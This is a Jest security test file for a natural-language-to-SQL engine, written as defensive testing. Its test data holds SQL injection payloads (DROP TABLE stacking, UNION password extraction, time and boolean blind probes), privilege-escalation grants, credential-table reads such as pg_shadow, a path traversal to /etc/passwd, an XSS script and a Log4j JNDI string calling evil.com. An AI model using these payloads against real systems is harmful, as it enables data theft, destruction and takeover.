/**
 * Security Tests: SQL Injection Prevention
 *
 * Comprehensive security tests for SQL injection prevention,
 * input sanitization, and access control
 */

import { describe, it, expect, jest, beforeEach, afterEach } from '@jest/globals';
import { NaturalLanguageToSQLEngine } from '../../src/actions/natural-language-to-sql.js';
import { DatabaseConnectionManager } from '../../src/database/connection-manager.js';
import { testUtils, TEST_CONSTANTS } from '../setup.js';

// Mock dependencies
jest.mock('openai', () => ({
  default: jest.fn().mockImplementation(() => ({
    chat: {
      completions: {
        create: jest.fn()
      }
    }
  }))
}));

jest.mock('../../src/security/query-validator.js', () => ({
  QueryValidator: jest.fn().mockImplementation(() => ({
    validateSQL: jest.fn().mockResolvedValue({
      valid: true,
      errors: [],
      warnings: [],
      security: {
        hasInjection: false,
        hasDataLeak: false,
        hasPrivilegeEscalation: false
      }
    })
  }))
}));

describe('SQL Injection Security Tests', () => {
  let engine: NaturalLanguageToSQLEngine;
  let connectionManager: DatabaseConnectionManager;
  let mockOpenAI: any;

  beforeEach(() => {
    engine = new NaturalLanguageToSQLEngine();
    connectionManager = new DatabaseConnectionManager();
    mockOpenAI = require('openai').default().chat.completions.create;
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Sanitization', () => {
    it('should sanitize DROP TABLE injection attempts', async () => {
      const maliciousInputs = [
        'Show me users; DROP TABLE users; --',
        'Get users; DROP TABLE users; SELECT',
        'List users" DROP TABLE users; --',
        "Display users' DROP TABLE users; --",
        'Show users; DROP TABLE /* comment */ users;'
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        expect(result.generatedSQL.sql).not.toContain('DROP TABLE');
        expect(result.generatedSQL.sql).not.toMatch(/drop\s+table/i);
      }
    });

    it('should sanitize UNION-based injection attempts', async () => {
      const maliciousInputs = [
        'Show me users UNION SELECT password FROM admin_users',
        'Get users UNION SELECT * FROM sensitive_data',
        'List users UNION SELECT 1,username,password,4 FROM admin'
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        expect(result.generatedSQL.sql).not.toContain('UNION SELECT');
        expect(result.generatedSQL.sql).not.toMatch(/union\s+select/i);
      }
    });

    it('should sanitize comment-based injection attempts', async () => {
      const maliciousInputs = [
        'Show me users -- malicious comment',
        'Get users /* malicious injection */',
        "Display users' /* injection */",
        'List users # injection'
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        // Comments might be preserved if they're part of natural language,
        // but shouldn't affect SQL structure
        expect(result.generatedSQL.sql).not.toMatch(/;\s*--/);
        expect(result.generatedSQL.sql).not.toMatch(/;\s*\/\*/);
      }
    });

    it('should sanitize time-based blind injection attempts', async () => {
      const maliciousInputs = [
        'Show me users; WAITFOR DELAY "00:00:10"',
        'Get users; SELECT pg_sleep(10)',
        'List users; SELECT SLEEP(10)',
        'Display users; SELECT BENCHMARK(10000000, MD5("test"))'
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        expect(result.generatedSQL.sql).not.toContain('pg_sleep');
        expect(result.generatedSQL.sql).not.toContain('SLEEP');
        expect(result.generatedSQL.sql).not.toContain('WAITFOR');
        expect(result.generatedSQL.sql).not.toContain('BENCHMARK');
      }
    });

    it('should sanitize boolean-based blind injection attempts', async () => {
      const maliciousInputs = [
        'Show me users WHERE 1=1 AND SUBSTRING(password,1,1) = "a"',
        'Get users WHERE id=1 AND ASCII(SUBSTRING(password,1,1)) > 64',
        'List users WHERE 1=1 AND (SELECT COUNT(*) FROM admin) > 0'
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        expect(result.generatedSQL.sql).not.toContain('SUBSTRING');
        expect(result.generatedSQL.sql).not.toContain('ASCII');
        expect(result.generatedSQL.sql).not.toContain('1=1');
      }
    });

    it('should sanitize encoded injection attempts', async () => {
      const maliciousInputs = [
        'Show me users%3B%20DROP%20TABLE%20users%3B%20--', // URL encoded
        'Get users; DR&#79;P TA&#66;LE users', // HTML encoded
        'List users\\u003B DROP TABLE users' // Unicode encoded
      ];

      for (const input of maliciousInputs) {
        const request = {
          naturalLanguage: input,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock safe OpenAI response
        mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(true);
        expect(result.generatedSQL.sql).not.toContain('DROP TABLE');
      }
    });
  });

  describe('Query Validation Security', () => {
    it('should detect dangerous SQL patterns', async () => {
      const dangerousQueries = [
        'DROP TABLE users',
        'DELETE FROM users',
        'TRUNCATE TABLE users',
        'UPDATE users SET password = "hacked"',
        'INSERT INTO users VALUES ("hacker", "password")',
        'ALTER TABLE users DROP COLUMN password',
        'CREATE TABLE hacked (data TEXT)',
        'GRANT ALL PRIVILEGES ON users TO hacker',
        'EXEC sp_configure "show advanced options", 1'
      ];

      // Mock dangerous pattern detection
      const QueryValidator = require('../../src/security/query-validator.js').QueryValidator;
      QueryValidator.mockImplementation(() => ({
        validateSQL: jest.fn().mockImplementation((sql) => {
          const hasDangerousPattern = dangerousQueries.some(dangerous =>
            sql.toLowerCase().includes(dangerous.toLowerCase())
          );

          return Promise.resolve({
            valid: !hasDangerousPattern,
            errors: hasDangerousPattern ? ['Dangerous SQL operation detected'] : [],
            warnings: [],
            security: {
              hasInjection: hasDangerousPattern,
              hasDataLeak: false,
              hasPrivilegeEscalation: hasDangerousPattern
            }
          });
        })
      }));

      for (const dangerousQuery of dangerousQueries) {
        const request = {
          naturalLanguage: 'Test query',
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        // Mock OpenAI to return dangerous query
        mockOpenAI.mockResolvedValue({
          choices: [{
            message: {
              content: JSON.stringify({
                sql: dangerousQuery,
                explanation: 'Test explanation',
                complexity: 'low',
                optimizations: []
              })
            }
          }]
        });

        const result = await engine.convertToSQL(request);

        // Should either fail validation or be sanitized
        if (result.validation) {
          if (result.validation.errors.length > 0) {
            expect(result.validation.errors[0]).toContain('Dangerous');
          }
        }
      }
    });

    it('should prevent data leakage through information schema', async () => {
      const dataLeakQueries = [
        'SELECT * FROM information_schema.tables',
        'SELECT column_name FROM information_schema.columns',
        'SELECT table_schema FROM information_schema.schemata',
        'SELECT * FROM pg_catalog.pg_tables',
        'SELECT * FROM mysql.user',
        'SELECT * FROM sys.database_principals'
      ];

      // Mock data leak detection
      const QueryValidator = require('../../src/security/query-validator.js').QueryValidator;
      QueryValidator.mockImplementation(() => ({
        validateSQL: jest.fn().mockImplementation((sql) => {
          const hasDataLeak = dataLeakQueries.some(leak =>
            sql.toLowerCase().includes(leak.toLowerCase())
          );

          return Promise.resolve({
            valid: !hasDataLeak,
            errors: hasDataLeak ? ['Access to system tables not allowed'] : [],
            warnings: [],
            security: {
              hasInjection: false,
              hasDataLeak: hasDataLeak,
              hasPrivilegeEscalation: false
            }
          });
        })
      }));

      for (const leakQuery of dataLeakQueries) {
        const request = {
          naturalLanguage: 'Test query',
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        mockOpenAI.mockResolvedValue({
          choices: [{
            message: {
              content: JSON.stringify({
                sql: leakQuery,
                explanation: 'Test explanation',
                complexity: 'low',
                optimizations: []
              })
            }
          }]
        });

        const result = await engine.convertToSQL(request);

        if (result.validation) {
          if (result.validation.errors.length > 0) {
            expect(result.validation.errors[0]).toContain('system tables');
          }
        }
      }
    });

    it('should prevent privilege escalation attempts', async () => {
      const privilegeEscalationQueries = [
        "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
        "ALTER USER admin WITH SUPERUSER",
        "EXEC sp_addsrvrolemember 'hacker', 'sysadmin'",
        "SET ROLE superuser",
        "CALL dbms_java.set_output(1000)"
      ];

      // Mock privilege escalation detection
      const QueryValidator = require('../../src/security/query-validator.js').QueryValidator;
      QueryValidator.mockImplementation(() => ({
        validateSQL: jest.fn().mockImplementation((sql) => {
          const hasPrivilegeEscalation = privilegeEscalationQueries.some(priv =>
            sql.toLowerCase().includes(priv.toLowerCase())
          );

          return Promise.resolve({
            valid: !hasPrivilegeEscalation,
            errors: hasPrivilegeEscalation ? ['Privilege escalation not allowed'] : [],
            warnings: [],
            security: {
              hasInjection: false,
              hasDataLeak: false,
              hasPrivilegeEscalation: hasPrivilegeEscalation
            }
          });
        })
      }));

      for (const privQuery of privilegeEscalationQueries) {
        const request = {
          naturalLanguage: 'Test query',
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        mockOpenAI.mockResolvedValue({
          choices: [{
            message: {
              content: JSON.stringify({
                sql: privQuery,
                explanation: 'Test explanation',
                complexity: 'low',
                optimizations: []
              })
            }
          }]
        });

        const result = await engine.convertToSQL(request);

        if (result.validation) {
          if (result.validation.errors.length > 0) {
            expect(result.validation.errors[0]).toContain('Privilege escalation');
          }
        }
      }
    });
  });

  describe('Connection Security', () => {
    it('should enforce secure connection requirements', async () => {
      const insecureConfig = {
        name: 'test-insecure',
        type: 'postgresql' as const,
        host: 'localhost',
        port: 5432,
        database: 'test',
        username: 'test',
        password: 'test',
        ssl: false // Insecure
      };

      // This test would depend on your security policies
      // For demonstration, we'll expect it to succeed but log a warning
      const connection = await connectionManager.createConnection(insecureConfig);

      expect(connection).toBeDefined();
      // In production, you might reject insecure connections
    });

    it('should validate connection credentials before storage', async () => {
      const config = testUtils.createTestConnectionConfig('postgresql');
      config.username = 'invalid_user';
      config.password = 'invalid_password';

      // Should fail gracefully without exposing credentials in logs
      await expect(connectionManager.createConnection(config))
        .rejects.toThrow();

      // Verify credentials are not exposed in error messages
      // This would depend on your error handling implementation
    });

    it('should handle SSH tunnel security', async () => {
      const configWithTunnel = {
        ...testUtils.createTestConnectionConfig('postgresql'),
        sshTunnel: {
          enabled: true,
          host: 'bastion.example.com',
          port: 22,
          username: 'tunnel_user',
          privateKey: '-----BEGIN RSA PRIVATE KEY-----\n...test key...\n-----END RSA PRIVATE KEY-----',
          bastion: true
        }
      };

      // Mock tunnel creation success
      const connection = await connectionManager.createConnection(configWithTunnel);

      expect(connection).toBeDefined();
      expect(connection.config.sshTunnel?.enabled).toBe(true);
    });

    it('should reject SSH tunnel with invalid credentials', async () => {
      const configWithInvalidTunnel = {
        ...testUtils.createTestConnectionConfig('postgresql'),
        sshTunnel: {
          enabled: true,
          host: 'invalid-bastion.example.com',
          port: 22,
          username: 'invalid_user',
          password: 'invalid_password'
        }
      };

      // Should fail due to invalid tunnel credentials
      await expect(connectionManager.createConnection(configWithInvalidTunnel))
        .rejects.toThrow();
    });
  });

  describe('Access Control and Authorization', () => {
    it('should enforce query result limits', async () => {
      const connection = await connectionManager.createConnection(
        testUtils.createTestConnectionConfig('postgresql')
      );

      // Execute query that would normally return many rows
      const result = await connectionManager.executeQuery(
        connection.id,
        'SELECT * FROM large_table',
        [],
        { limit: 1000 }
      );

      expect(result.rows.length).toBeLessThanOrEqual(1000);
    });

    it('should prevent access to restricted database objects', async () => {
      const restrictedQueries = [
        'SELECT * FROM pg_shadow',
        'SELECT * FROM mysql.user',
        'SELECT * FROM sys.database_principals',
        'SELECT * FROM pg_authid'
      ];

      // Mock restricted object access detection
      const QueryValidator = require('../../src/security/query-validator.js').QueryValidator;
      QueryValidator.mockImplementation(() => ({
        validateSQL: jest.fn().mockImplementation((sql) => {
          const hasRestrictedAccess = restrictedQueries.some(restricted =>
            sql.toLowerCase().includes(restricted.toLowerCase())
          );

          return Promise.resolve({
            valid: !hasRestrictedAccess,
            errors: hasRestrictedAccess ? ['Access to restricted objects not allowed'] : [],
            warnings: [],
            security: {
              hasInjection: false,
              hasDataLeak: hasRestrictedAccess,
              hasPrivilegeEscalation: false
            }
          });
        })
      }));

      for (const restrictedQuery of restrictedQueries) {
        const request = {
          naturalLanguage: 'Test query',
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        mockOpenAI.mockResolvedValue({
          choices: [{
            message: {
              content: JSON.stringify({
                sql: restrictedQuery,
                explanation: 'Test explanation',
                complexity: 'low',
                optimizations: []
              })
            }
          }]
        });

        const result = await engine.convertToSQL(request);

        if (result.validation) {
          if (result.validation.errors.length > 0) {
            expect(result.validation.errors[0]).toContain('restricted objects');
          }
        }
      }
    });

    it('should log security violations', async () => {
      const maliciousQuery = 'DROP TABLE users';
      const connection = await connectionManager.createConnection(
        testUtils.createTestConnectionConfig('postgresql')
      );

      // Attempt to execute dangerous query
      try {
        await connectionManager.executeQuery(connection.id, maliciousQuery);
      } catch (error) {
        // Expected to fail
      }

      // Verify security event was logged
      // This would depend on your logging implementation
      const connectionMetrics = connection.metrics;
      expect(connectionMetrics.failedQueries).toBeGreaterThan(0);
      expect(connectionMetrics.lastError).toBeDefined();
    });
  });

  describe('Input Length and Complexity Limits', () => {
    it('should reject extremely long natural language inputs', async () => {
      const veryLongInput = 'A'.repeat(10000); // 10k characters

      const request = {
        naturalLanguage: veryLongInput,
        connectionId: 'test-connection',
        databaseType: 'postgresql'
      };

      const result = await engine.convertToSQL(request);

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should limit query complexity', async () => {
      const complexQuery = `
        SELECT * FROM table1
        JOIN table2 ON table1.id = table2.id
        JOIN table3 ON table2.id = table3.id
        JOIN table4 ON table3.id = table4.id
        JOIN table5 ON table4.id = table5.id
        WHERE complex_condition1 AND complex_condition2
        ORDER BY multiple_columns
        LIMIT 1000
      `;

      const request = {
        naturalLanguage: 'Complex multi-join query',
        connectionId: 'test-connection',
        databaseType: 'postgresql',
        maxComplexity: 'low'
      };

      mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse(complexQuery));

      const result = await engine.convertToSQL(request);

      // Should either simplify the query or reject it
      expect(result.generatedSQL.complexity).toBe('low');
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    it('should implement rate limiting for API calls', async () => {
      const request = {
        naturalLanguage: 'Show me users',
        connectionId: 'test-connection',
        databaseType: 'postgresql'
      };

      mockOpenAI.mockResolvedValue(testUtils.createMockOpenAIResponse('SELECT * FROM users'));

      // Make multiple rapid requests
      const promises = Array(100).fill(null).map(() => engine.convertToSQL(request));

      const results = await Promise.allSettled(promises);

      // Some requests should be rate limited
      const failedResults = results.filter(r => r.status === 'rejected');
      expect(failedResults.length).toBeGreaterThan(0);

      // Verify rate limiting error message
      failedResults.forEach(result => {
        if (result.status === 'rejected') {
          expect(result.reason.message).toContain('rate limit');
        }
      });
    });

    it('should detect and prevent automated abuse', async () => {
      const suspiciousInputs = [
        'a'.repeat(1000), // Repetitive input
        String.fromCharCode(...Array(1000).fill(0)), // Null bytes
        '\x00\x01\x02\x03', // Control characters
        '../../etc/passwd', // Path traversal attempt
        '<script>alert("xss")</script>', // XSS attempt
        '${jndi:ldap://evil.com/a}' // Log4j injection attempt
      ];

      for (const suspiciousInput of suspiciousInputs) {
        const request = {
          naturalLanguage: suspiciousInput,
          connectionId: 'test-connection',
          databaseType: 'postgresql'
        };

        const result = await engine.convertToSQL(request);

        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
      }
    });
  });

  describe('Data Encryption and Secure Storage', () => {
    it('should encrypt stored connection credentials', async () => {
      const config = testUtils.createTestConnectionConfig('postgresql');
      config.password = 'sensitive_password';

      const connection = await connectionManager.createConnection(config);

      // Verify password is not stored in plain text
      expect(connection.config.password).not.toBe('sensitive_password');
      // In a real implementation, password should be encrypted
    });

    it('should use secure communication channels', async () => {
      const secureConfig = {
        ...testUtils.createTestConnectionConfig('postgresql'),
        ssl: true,
        sslMode: 'require',
        sslCert: '/path/to/cert.pem',
        sslKey: '/path/to/key.pem',
        sslCA: '/path/to/ca.pem'
      };

      const connection = await connectionManager.createConnection(secureConfig);

      expect(connection.config.ssl).toBe(true);
      // Verify SSL configuration is properly applied
    });
  });
});
